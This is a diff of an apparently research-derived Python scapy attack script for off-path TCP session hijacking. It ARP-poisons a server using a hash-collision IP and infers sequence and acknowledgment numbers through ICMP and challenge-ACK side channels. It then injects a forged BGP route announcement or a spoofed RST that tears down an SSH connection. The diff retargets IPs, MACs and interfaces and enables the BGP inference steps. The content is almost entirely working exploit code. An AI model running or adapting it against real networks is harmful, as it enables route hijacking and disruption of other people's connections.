@@ -34,20 +34,21 @@ from scapy.layers.l2 import *
     @Modify:        2020/3/10    Kevin.F:    add ICMP Filter equation
     
 """
-forge_ip = '10.10.4.197'                    # hash collision IP (get form collision_find.py)
-victim_ip = '10.10.100.1'                   # victim ip address
-server_ip = '10.10.100.2'                   # server ip address
-server_port = 22                            # known server port (e.g. ssh:22 BGP:179)
-client_port = 51170                         # found client port
+forge_ip = '192.168.4.107'                  # hash collision IP (get form collision_find.py)
+victim_ip = '192.168.66.111'                # victim ip address
+server_ip = '192.168.66.112'                # server ip address
+server_port = 179                           # known server port (e.g. ssh:22 BGP:179)
+client_port = 46562                         # found client port
 
-seq_in_win = 266041989                      # sequence number in receive window
+seq_in_win = 2228462100                     # sequence number in receive window
 ack_check_start = -1                        # in-challenge-window ack number
 ack_left_bound = -1                         # left bound of challenge-ack-window
 ack_in_win = -1                             # acceptable ack number
 seq_num = -1                                # exact sequence number
 
-server_mac_addr = '00:0c:29:20:f4:8c'       # mac address of server used for ARP poison
-my_mac_addr = get_if_hwaddr('ens33')        # mac address of attacker
+server_mac_addr = '60:eb:69:dc:1b:14'       # mac address of server used for ARP poison
+my_if_name = 'eno1'
+my_mac_addr = get_if_hwaddr(my_if_name)     # mac address of attacker
 z_payload = b''                             # full-zero byte string used for padding
 
 BLOCK = 26703 * 3                           # sampling step-length
@@ -71,13 +72,13 @@ def arp_inject():
     forged_ip = forge_ip
     # here we send a UDP packet to allure server to execute ip/mac convert
     pkt = sniff(filter="arp " + "and dst " + forged_ip + " and ether src " + server_mac_addr,
-                iface='ens33', timeout=0.5, count=1, started_callback=
-                lambda: send(IP(src=forged_ip, dst=server_ip) / UDP(dport=80),
-                             iface='ens33', verbose=False))
+                iface=my_if_name, timeout=0.5, count=1, started_callback=
+                lambda: send(IP(src=forged_ip, dst=server_ip) / UDP(dport=80), 
+		iface=my_if_name, verbose=False))
 
     if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
         send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
-             iface='ens33', verbose=False)
+             iface=my_if_name, verbose=False)
 
     time.sleep(1)
 
@@ -101,7 +102,7 @@ def tcp_fragment():
          IP(flags=2, src=server_ip, dst=victim_ip) /
          ICMP(type=0, code=0) /
          z_payload,
-         iface='ens33', verbose=False)
+         iface=my_if_name, verbose=False)
 
     time.sleep(1)
 
@@ -130,8 +131,8 @@ def check_new_list(list_p):
 
     while True:
         pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + forge_ip,
-                     iface='ens33', count=1 + C, timeout=1.5, started_callback=
-                     lambda: send(send_list, iface='ens33', verbose=False))
+                     iface=my_if_name, count=1 + C, timeout=1.5, started_callback=
+                     lambda: send(send_list, iface=my_if_name, verbose=False))
         if len(pkts) != 1 + C:
             time.sleep(sleep_time)
         else:
@@ -164,19 +165,19 @@ def check_new_list(list_p):
 """
 def check_new_point_seq(list_p):
     C = len(list_p)
-
+    icmp_seq = random.randint(0, (1 << 16) - 1)
     send_list = [IP(src=victim_ip, dst=server_ip) /
                  TCP(sport=client_port, dport=server_port, seq=seq_in_win, ack=ack_check_start, flags='A'),
-                 IP(src=forge_ip, dst=server_ip) / ICMP()]
+                 IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq)]
     for sq in list_p:
         send_list.append(IP(src=victim_ip, dst=server_ip) /
                          TCP(sport=client_port, dport=server_port, seq=sq, ack=ack_check_start, flags='A') / 'a')
-        send_list.append(IP(src=forge_ip, dst=server_ip) / ICMP())
+        send_list.append(IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq))
 
     while True:
-        pkts = sniff(filter="icmp and dst " + forge_ip,
-                     iface='ens33', count=1 + C, timeout=1.5, started_callback=
-                     lambda: send(send_list, iface='ens33', verbose=False))
+        pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + forge_ip,
+                     iface=my_if_name, count=1 + C, timeout=2, started_callback=
+                     lambda: send(send_list, iface=my_if_name, verbose=False))
         if len(pkts) != 1 + C:
             time.sleep(sleep_time)
         else:
@@ -209,7 +210,7 @@ def find_seq():
 
     rb = seq_in_win
     lb = seq_in_win - (BLOCK * 2)
-    D = 6
+    D = 3
 
     ans = -1
     while rb >= lb:
@@ -247,17 +248,17 @@ def find_seq():
 """
 def check_new_point_ack(list_p):
     C = len(list_p)
-
-    send_list = [IP(src=forge_ip, dst=server_ip) / ICMP()]
+    icmp_seq = random.randint(0, (1 << 16) - 1)
+    send_list = [IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq)]
     for ac in list_p:
         send_list.append(IP(src=victim_ip, dst=server_ip) /
                          TCP(sport=client_port, dport=server_port, seq=seq_in_win, ack=ac, flags='A'))
-        send_list.append(IP(src=forge_ip, dst=server_ip) / ICMP())
+        send_list.append(IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq))
 
     while True:
-        pkts = sniff(filter="icmp and dst " + forge_ip,
-                     iface='ens33', count=1 + C, timeout=1.5, started_callback=
-                     lambda: send(send_list, iface='ens33', verbose=False))
+        pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + forge_ip,
+                     iface=my_if_name, count=1 + C, timeout=2, started_callback=
+                     lambda: send(send_list, iface=my_if_name, verbose=False))
         if len(pkts) != 1 + C:
             time.sleep(sleep_time)
         else:
@@ -288,7 +289,7 @@ def check_new_point_ack(list_p):
                 perform multi-bin search.
 """
 def C(ls, lb, rb):
-    D = 2
+    D = 4
     # revise
     for i in range(0, len(ls)):
         ls[i] = ls[i] if ls[i] >= 0 else ls[i] + (1 << 32)
@@ -407,7 +408,7 @@ def attack_action_bgp():
     flag3 = 0x40
     type3 = 3
     len3 = 4
-    next_hop = socket.inet_aton('10.10.100.1')
+    next_hop = socket.inet_aton('192.168.66.111')
     attr3 = struct.pack('!BBB4s', flag3, type3, len3, next_hop)
 
     # attr4
@@ -419,7 +420,7 @@ def attack_action_bgp():
 
     # address info
     prefix_len = 24
-    network_addr = socket.inet_aton('11.11.11.0')
+    network_addr = socket.inet_aton('77.77.77.0')
     b_network = struct.pack('!B3s', prefix_len, network_addr[:3])
 
     bgp_payload = one_payload + hd_bgp + attr1 + attr2 + attr3 + attr4 + b_network
@@ -430,7 +431,7 @@ def attack_action_bgp():
                      TCP(sport=client_port, dport=server_port, seq=seq_num + 1, ack=ack_in_win, flags='PA') /
                      bgp_payload)
 
-    send(send_list, iface='ens33', verbose=False)
+    send(send_list, iface=my_if_name, verbose=False)
 
 
 """
@@ -446,7 +447,7 @@ def attack_action_bgp():
 def attack_action_ssh():
     send(IP(src=victim_ip, dst=server_ip, tos=0xc0) /
          TCP(sport=client_port, dport=server_port, seq=seq_num + 1, flags='R'),
-         iface='ens33', verbose=False)
+         iface=my_if_name, verbose=False)
 
 
 if __name__ == '__main__':
@@ -465,16 +466,16 @@ if __name__ == '__main__':
     tr.start()
 
     # attack BGP
-    # find_ack_challenge_win()
-    # find_left_bound_ack()
-    # find_seq()
-    # time.sleep(sleep_time)
+    find_ack_challenge_win()
+    find_left_bound_ack()
+    find_seq()
+    time.sleep(sleep_time)
     # attack_action_bgp()
 
     # attack SSH
-    find_ack_challenge_win()
-    find_seq()
-    attack_action_ssh()
+    # find_ack_challenge_win()
+    # find_seq()
+    # attack_action_ssh()
 
     endtime = datetime.now()
     print((endtime - starttime).seconds)
